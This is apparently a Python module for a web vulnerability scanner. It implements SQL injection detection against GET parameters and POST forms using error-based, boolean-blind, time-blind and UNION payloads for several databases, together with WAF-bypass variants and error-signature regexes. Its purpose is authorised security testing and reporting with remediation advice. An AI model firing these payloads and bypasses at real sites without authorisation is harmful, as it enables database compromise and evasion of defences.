import re
import logging
import urllib.parse
from urllib.parse import urlparse, urlencode, parse_qs
from app.scanner.vulnerabilities.base import BaseScanner
from app.scanner.payload_manager import get_payload_manager

logger = logging.getLogger(__name__)


class SQLInjectionScanner(BaseScanner):
    """SQL Injection scanner with error-based, boolean-blind, time-blind,
    UNION-based detection, WAF bypass, and validation — across GET parameters
    and POST forms."""

    # ── Payloads ─────────────────────────────────────────────────────

    def __init__(self, session=None, timeout=8, delay=0.5):
        super().__init__(session, timeout, delay)
        try:
            self.payload_manager = get_payload_manager()
            pm_payloads = self.payload_manager.get_payloads('sql_injection', source='both')
            # Enrich ERROR_PAYLOADS with PayloadManager payloads (instance-level copy)
            existing = set(self.ERROR_PAYLOADS)
            extra = [p for p in pm_payloads if p not in existing]
            self.ERROR_PAYLOADS = list(self.ERROR_PAYLOADS) + extra
            stats = self.payload_manager.get_stats()
            count = stats['total'].get('sql_injection', 0)
            logger.info(f'SQL Injection: {count} payloads available ({len(extra)} new from PayloadManager)')
        except Exception as e:
            self.payload_manager = None
            logger.debug(f'PayloadManager not available: {e}')

        # AI-generated smart payloads
        try:
            smart = self._get_smart_payloads('sql_injection')
            if smart:
                existing_set = set(self.ERROR_PAYLOADS)
                new_smart = [p for p in smart if p not in existing_set]
                self.ERROR_PAYLOADS = list(self.ERROR_PAYLOADS) + new_smart
        except Exception:
            pass

    ERROR_PAYLOADS = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        '" OR "1"="1',
        '" OR "1"="1" --',
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1' UNION SELECT NULL--",
        "admin'--",
        "1; SELECT 1--",
        "') OR ('1'='1",
        '") OR ("1"="1',
        "1 OR 1=1",
        "' OR ''='",
        "1' AND '1'='1",
        "1)) OR ((1=1",
        "' AND 1=2 UNION SELECT NULL--",
        "1' AND 1=CONVERT(int, (SELECT @@version))--",
        "%' AND '1'='1",
        "1' ORDER BY 10--",
        "1' GROUP BY 1,2,3,4,5--",
    ]

    BOOLEAN_TRUE = [
        ("' OR '1'='1' --", "' OR '1'='2' --"),
        ('" OR "1"="1" --', '" OR "1"="2" --'),
        ("' OR 1=1 --", "' OR 1=2 --"),
        ("1 OR 1=1", "1 OR 1=2"),
        ("') OR ('1'='1", "') OR ('1'='2"),
        ("' AND '1'='1", "' AND '1'='2"),
        ("' AND 'a'='a", "' AND 'a'='b"),
        ("1' AND 1=1 AND '1'='1", "1' AND 1=2 AND '1'='1"),
    ]

    TIME_PAYLOADS = [
        # MySQL
        ("' OR SLEEP({delay})--", "mysql"),
        ("' OR SLEEP({delay})#", "mysql"),
        ("1' AND SLEEP({delay})--", "mysql"),
        ("') AND SLEEP({delay})--", "mysql"),
        ("' OR BENCHMARK(5000000,SHA1('test'))--", "mysql"),
        ("1 AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "mysql"),
        # PostgreSQL
        ("' OR pg_sleep({delay})--", "pgsql"),
        ("'; SELECT pg_sleep({delay})--", "pgsql"),
        ("1' AND pg_sleep({delay})--", "pgsql"),
        # SQLite
        ("' OR randomblob(100000000)--", "sqlite"),
        # MSSQL
        ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql"),
        ("' OR 1=1; WAITFOR DELAY '0:0:{delay}'--", "mssql"),
        ("1' WAITFOR DELAY '0:0:{delay}'--", "mssql"),
        # Oracle
        ("' AND DBMS_LOCK.SLEEP({delay})--", "oracle"),
    ]

    UNION_PROBES = [
        "' UNION SELECT {cols}--",
        "' UNION ALL SELECT {cols}--",
        '" UNION SELECT {cols}--',
        "') UNION SELECT {cols}--",
    ]

    # ── Error signatures (organized by database) ─────────────────────
    ERROR_PATTERNS = {
        'mysql': [
            r"you have an error in your sql syntax",
            r"warning:\s*mysql",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"MariaDB server version",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL",
            r"com\.mysql\.jdbc",
            r"sql syntax.*mysql",
        ],
        'postgresql': [
            r"postgresql.*error",
            r"pg_query",
            r"pg_exec",
            r"valid PostgreSQL result",
            r"unterminated quoted string",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"Warning:\s*pg_",
        ],
        'sqlite': [
            r"sqlite3?\.OperationalError",
            r"sqlite.*error",
            r"unrecognized token",
            r'near ".*": syntax error',
        ],
        'mssql': [
            r"microsoft ole db provider for sql server",
            r"unclosed quotation mark after the character string",
            r"mssql_query",
            r"\bODBC SQL Server Driver\b",
            r"SqlException",
            r"Incorrect syntax near",
            r"Driver\.*SQL[\-\_\ ]*Server",
            r"Microsoft SQL Native Client error",
            r"Warning.*mssql_",
        ],
        'oracle': [
            r"ora-\d{5}",
            r"oracle.*driver",
            r"quoted string not properly terminated",
            r"Warning.*oci_",
        ],
        'generic': [
            r"SQL[\s]*Error",
            r"SQLSTATE\[",
            r"syntax error.*sql",
            r"sql.*syntax",
            r"sqlsyntaxerrorexception",
            r"odbc microsoft access driver",
            r"database error",
            r"PDOException",
            r"JDBC.*Exception",
            r"DB2 SQL error",
            r"Sybase message",
            r"unexpected end of SQL command",
        ],
    }

    SLEEP_DELAY = 3  # seconds for time-based tests

    # ── Detection helpers ────────────────────────────────────────────

    def _check_error_based(self, response_text):
        """Check if response contains SQL error signatures.
        Returns (found, evidence, db_type)."""
        if not response_text:
            return False, None, None
        text_lower = response_text.lower()
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, text_lower)
                if match:
                    return True, match.group(0), db_type
        return False, None, None

    def _build_url(self, parsed, params, param_name, payload):
        """Build test URL with payload injected into a specific param."""
        test_params = dict(params)
        test_params[param_name] = [payload]
        query = '&'.join(f"{k}={v[0]}" for k, v in test_params.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

    # ── WAF bypass generation (merged from enhanced) ─────────────────

    def _generate_waf_bypasses(self, payload):
        """Generates WAF bypass variations of a payload."""
        bypasses = []

        # Case variation
        bypasses.append(payload.upper())
        bypasses.append(''.join(
            c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)
        ))

        # Comment insertion in SQL keywords
        for keyword in ('SELECT', 'UNION', 'ORDER', 'GROUP', 'SLEEP', 'WAITFOR'):
            if keyword in payload.upper():
                mid = len(keyword) // 2
                bypasses.append(
                    re.sub(keyword, keyword[:mid] + '/**/' + keyword[mid:],
                           payload, flags=re.IGNORECASE)
                )

        # Space alternatives
        bypasses.append(payload.replace(' ', '/**/'))
        bypasses.append(payload.replace(' ', '\t'))

        # Null byte suffix
        bypasses.append(payload + '%00')

        return bypasses

    # ── Error-based detection ────────────────────────────────────────

    def _test_error_based(self, url, param_name, params, parsed):
        """Test for error-based SQL injection with WAF bypass."""
        for payload in self.ERROR_PAYLOADS:
            payloads_to_test = [payload] + self._generate_waf_bypasses(payload)[:3]

            for test_payload in payloads_to_test:
                test_url = self._build_url(parsed, params, param_name, test_payload)
                response = self._request('GET', test_url)
                if response:
                    found, evidence, db_type = self._check_error_based(response.text)
                    if found:
                        # Validate to reduce false positives
                        is_valid, confidence = self._validate_finding(
                            url, param_name, params, parsed, test_payload, 'error-based'
                        )
                        if is_valid:
                            return {
                                'technique': f'error-based ({db_type})',
                                'payload': test_payload,
                                'url': test_url,
                                'param': param_name,
                                'evidence': f'SQL error detected ({db_type}): {evidence}',
                                'confidence': confidence,
                                'database': db_type,
                            }
        return None

    # ── Boolean-based blind detection ────────────────────────────────

    def _test_boolean_blind(self, url, param_name, params, parsed):
        """Test for boolean-based blind SQL injection by comparing true/false responses."""
        # Baseline stability check: issue 2 identical requests and compare
        baseline_resp1 = self._request('GET', url)
        baseline_resp2 = self._request('GET', url)
        if not baseline_resp1 or not baseline_resp2:
            return None
        baseline_len = len(baseline_resp1.text)
        baseline_jitter = abs(len(baseline_resp1.text) - len(baseline_resp2.text))

        # If the page is too dynamic (>100 char jitter), skip boolean-blind
        if baseline_jitter > 100:
            return None

        for true_payload, false_payload in self.BOOLEAN_TRUE:
            true_url = self._build_url(parsed, params, param_name, true_payload)
            false_url = self._build_url(parsed, params, param_name, false_payload)

            true_resp = self._request('GET', true_url)
            false_resp = self._request('GET', false_url)

            if not true_resp or not false_resp:
                continue

            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant difference between true and false responses
            len_diff = abs(true_len - false_len)
            # The true condition response should be closer to baseline
            true_baseline_diff = abs(true_len - baseline_len)
            false_baseline_diff = abs(false_len - baseline_len)

            # Require difference to be much larger than baseline jitter
            # and above the minimum threshold of 200 chars
            if (len_diff > max(200, baseline_jitter * 3)
                    and (true_resp.status_code != false_resp.status_code
                         or true_baseline_diff < false_baseline_diff)):
                return {
                    'technique': 'boolean-blind',
                    'payload': f'{true_payload} vs {false_payload}',
                    'url': true_url,
                    'param': param_name,
                    'evidence': (
                        f'Response length diff: {len_diff} chars '
                        f'(true={true_len}, false={false_len}, jitter={baseline_jitter})'
                    ),
                    'confidence': 85,
                }
        return None

    # ── Time-based blind detection ───────────────────────────────────

    def _test_time_blind(self, url, param_name, params, parsed):
        """Test for time-based blind SQL injection using SLEEP/WAITFOR."""
        # Get baseline timing
        baseline = self._get_baseline_time(url)

        for payload_template, db_type in self.TIME_PAYLOADS:
            payload = payload_template.format(delay=self.SLEEP_DELAY)
            test_url = self._build_url(parsed, params, param_name, payload)

            resp, elapsed = self._timed_request('GET', test_url)

            # If response took significantly longer than baseline + delay threshold
            if elapsed >= baseline + self.SLEEP_DELAY - 0.5:
                # Verify with a second request to reduce false positives
                resp2, elapsed2 = self._timed_request('GET', test_url)
                if elapsed2 >= baseline + self.SLEEP_DELAY - 0.5:
                    return {
                        'technique': f'time-blind ({db_type})',
                        'payload': payload,
                        'url': test_url,
                        'param': param_name,
                        'evidence': f'Response delayed by {elapsed:.1f}s (baseline: {baseline:.1f}s)',
                        'confidence': 90,
                        'database': db_type,
                    }
        return None

    # ── UNION-based detection ────────────────────────────────────────

    def _test_union(self, url, param_name, params, parsed):
        """Test for UNION-based SQL injection by enumerating column counts."""
        # First find column count via ORDER BY
        col_count = None
        for i in range(1, 15):
            order_payload = f"' ORDER BY {i}--"
            test_url = self._build_url(parsed, params, param_name, order_payload)
            resp = self._request('GET', test_url)
            if resp:
                found, _, _ = self._check_error_based(resp.text)
                if found:
                    col_count = i - 1
                    break

        if not col_count or col_count < 1:
            return None

        # Try UNION SELECT with discovered column count
        cols = ','.join(['NULL'] * col_count)
        for template in self.UNION_PROBES:
            payload = template.format(cols=cols)
            test_url = self._build_url(parsed, params, param_name, payload)
            resp = self._request('GET', test_url)
            if resp and resp.status_code == 200:
                found, _, _ = self._check_error_based(resp.text)
                if not found:  # UNION succeeded without errors
                    return {
                        'technique': f'union-based ({col_count} columns)',
                        'payload': payload,
                        'url': test_url,
                        'param': param_name,
                        'evidence': f'UNION SELECT with {col_count} columns returned valid response',
                        'confidence': 95,
                    }
        return None

    # ── Validation (merged from enhanced) ────────────────────────────

    def _validate_finding(self, url, param_name, params, parsed, payload, technique):
        """Validates an SQL injection finding to reduce false positives.
        Returns (is_valid, confidence_percentage)."""
        score = 0
        max_score = 4

        # Test 1: Multiple similar payloads trigger errors
        if technique == 'error-based':
            similar = [payload, payload.replace("'", '"'), payload + " --"]
            positives = 0
            for sp in similar:
                test_url = self._build_url(parsed, params, param_name, sp)
                resp = self._request('GET', test_url)
                if resp:
                    found, _, _ = self._check_error_based(resp.text)
                    if found:
                        positives += 1
            if positives >= 2:
                score += 2

        # Test 2: Baseline comparison — different status or length
        baseline = self._request('GET', url)
        injected = self._request('GET', self._build_url(parsed, params, param_name, payload))
        if baseline and injected:
            if baseline.status_code != injected.status_code:
                score += 1
            elif abs(len(injected.text) - len(baseline.text)) > 50:
                score += 1

        # Test 3: SQL keywords in error page
        if injected:
            kw_count = sum(
                1 for kw in ('SELECT', 'FROM', 'WHERE', 'syntax', 'query', 'SQL')
                if kw.lower() in injected.text.lower()
            )
            if kw_count >= 3:
                score += 1

        confidence = int((score / max_score) * 100)
        return score >= 2, confidence

    # ── Form testing ─────────────────────────────────────────────────

    def _test_form(self, form):
        """Test form inputs individually for SQL injection."""
        results = []
        url = form.get('action', '')
        method = form.get('method', 'get').upper()
        inputs = form.get('inputs', [])

        # Identify testable fields
        testable = [inp for inp in inputs
                    if inp['type'] not in ('submit', 'button', 'hidden', 'csrf', 'image', 'reset')]

        for target_input in testable:
            for payload in self.ERROR_PAYLOADS[:10]:
                data = {}
                for inp in inputs:
                    if inp['name'] == target_input['name']:
                        data[inp['name']] = payload
                    elif inp['type'] in ('submit', 'button'):
                        data[inp['name']] = inp.get('value', 'Submit')
                    else:
                        data[inp['name']] = inp.get('value', '') or 'test'

                if method == 'POST':
                    response = self._request('POST', url, data=data)
                else:
                    response = self._request('GET', url, params=data)

                if response:
                    found, evidence, db_type = self._check_error_based(response.text)
                    if found:
                        results.append({
                            'technique': f'error-based (form, {db_type})',
                            'payload': payload,
                            'url': url,
                            'param': target_input['name'],
                            'method': method,
                            'evidence': f'SQL error ({db_type}): {evidence}',
                            'confidence': 85,
                            'database': db_type,
                        })
                        break  # Move to next field

            # Time-based blind on forms
            if not any(r['param'] == target_input['name'] for r in results):
                for payload_template, db_type in self.TIME_PAYLOADS[:4]:
                    payload = payload_template.format(delay=self.SLEEP_DELAY)
                    data = {}
                    for inp in inputs:
                        if inp['name'] == target_input['name']:
                            data[inp['name']] = payload
                        elif inp['type'] in ('submit', 'button'):
                            data[inp['name']] = inp.get('value', 'Submit')
                        else:
                            data[inp['name']] = inp.get('value', '') or 'test'

                    baseline = self._get_baseline_time(
                        url, method=method, data=data if method == 'POST' else None
                    )
                    if method == 'POST':
                        resp, elapsed = self._timed_request('POST', url, data=data)
                    else:
                        resp, elapsed = self._timed_request('GET', url, params=data)

                    if elapsed >= baseline + self.SLEEP_DELAY - 0.5:
                        results.append({
                            'technique': f'time-blind ({db_type}, form)',
                            'payload': payload,
                            'url': url,
                            'param': target_input['name'],
                            'method': method,
                            'evidence': f'Response delayed: {elapsed:.1f}s vs baseline {baseline:.1f}s',
                            'confidence': 80,
                            'database': db_type,
                        })
                        break

        return results

    # ── Error snippet extraction (merged from enhanced) ──────────────

    def _extract_error_snippet(self, response_text, max_length=200):
        """Extracts relevant error message snippet from response."""
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    start = max(0, match.start() - 50)
                    end = min(len(response_text), match.end() + 150)
                    snippet = response_text[start:end].strip()
                    # Clean up HTML tags
                    snippet = re.sub(r'<[^>]+>', '', snippet)
                    if len(snippet) > max_length:
                        snippet = snippet[:max_length] + "..."
                    return snippet
        return "SQL error detected in response"

    # ── Main scan ────────────────────────────────────────────────────

    def _make_finding(self, result):
        technique = result['technique']
        severity = 'critical'
        cvss = 9.8
        confidence = result.get('confidence', 85)
        db_info = result.get('database', 'unknown')

        if 'blind' in technique:
            description = (
                f'SQL injection detected via {technique}. '
                'The application does not display SQL errors, but the vulnerability '
                'is confirmed via indirect observation (timing or content differences).'
            )
        elif 'union' in technique:
            description = (
                f'UNION-based SQL injection found ({technique}). '
                'An attacker can extract data from the database by appending '
                'UNION SELECT queries.'
            )
        else:
            description = (
                f'Error-based SQL injection detected (DB: {db_info}). User-supplied '
                'input is incorporated into SQL queries without sanitization, causing '
                'database errors that reveal query structure.'
            )

        finding = {
            'vuln_type': 'sql_injection',
            'name': f'SQL Injection ({technique})',
            'description': description,
            'impact': 'Complete database compromise: read/modify/delete data, bypass authentication, execute OS commands, pivot to internal network.',
            'severity': severity,
            'cvss_score': cvss,
            'confidence': confidence,
            'owasp_category': 'A03',
            'cwe': 'CWE-89',
            'affected_url': result['url'],
            'parameter': result['param'],
            'payload': result['payload'],
            'request_data': f"{result.get('method', 'GET')} {result['url']}\nParam: {result['param']}={result['payload']}",
            'response_data': result.get('evidence', 'SQL injection confirmed'),
            'remediation': 'Use parameterized queries / prepared statements. Never concatenate user input into SQL. Use an ORM. Apply least-privilege DB accounts. Implement WAF rules.'
        }
        if 'difficulty' in result:
            finding['difficulty'] = result['difficulty']
        return finding

    def scan(self, target_url, injectable_points):
        self.findings = []
        seen = set()

        for point in injectable_points:
            # ── Test forms ──
            if isinstance(point, dict) and point.get('type') == 'form':
                form_results = self._test_form(point)
                for result in form_results:
                    key = f"{result['url']}:{result['param']}"
                    if key not in seen:
                        seen.add(key)
                        self.findings.append(self._make_finding(result))

            # ── Test URL parameters ──
            elif isinstance(point, dict) and 'name' in point:
                url = point.get('url', target_url)
                param_name = point['name']
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                key = f"{url}:{param_name}"

                if key in seen or param_name not in params:
                    continue

                # Try techniques in order: error → boolean-blind → time-blind → union
                result = self._test_error_based(url, param_name, params, parsed)

                if not result:
                    result = self._test_boolean_blind(url, param_name, params, parsed)

                if not result:
                    result = self._test_time_blind(url, param_name, params, parsed)

                if not result:
                    result = self._test_union(url, param_name, params, parsed)

                if result:
                    seen.add(key)
                    self.findings.append(self._make_finding(result))

        return self.findings
